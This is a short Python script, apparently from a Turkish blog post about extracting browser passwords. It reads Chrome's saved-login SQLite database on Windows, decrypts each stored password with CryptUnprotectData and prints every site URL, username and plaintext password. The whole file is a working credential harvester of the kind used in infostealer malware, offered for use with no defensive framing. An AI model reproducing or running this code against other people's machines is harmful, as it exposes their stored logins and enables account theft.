#####################################################################
## github @umutbasal                                               ##
##                                                                 ##
## UMUT BASAL BLOG https://www.umutbasal.com                       ##
##                                                                 ##
## https://www.umutbasal.com/python-ile-tarayici-sifrelerini-alma/ ##
#####################################################################
import os
import sys
import sqlite3
import win32crypt

PathName = (os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\')
FileName = ('Login Data')

def main():
	value_list = []
	try:
		connect = sqlite3.connect(PathName+FileName)
		with connect:
			cursor = connect.cursor()
			sql = cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
			values = sql.fetchall()
		for value in values:
			password = win32crypt.CryptUnprotectData(value[2], None, None, None, 0)[1]
			value_list.append({
				'url':value[0],
				'username':value[1],
				'password':str(password)
				})
	except sqlite3.OperationalError as err:
		err = str(err)
		if (err == 'database is locked'):
			print("[!] Chrome Arka planda Aktif")
			sys.exit(0)
		elif (err == 'no such table: logins'):
			print("[!] Veritabaninda logins adinda tablo bulunamadi")
			sys.exit(0)
		elif (err == 'unable to open database file'):
			print("[!] Veritabani yolu hatali veya izin yok")
			sys.exit(0)
		else:
			print(err)
			sys.exit(0)
	print(value_list)
main()
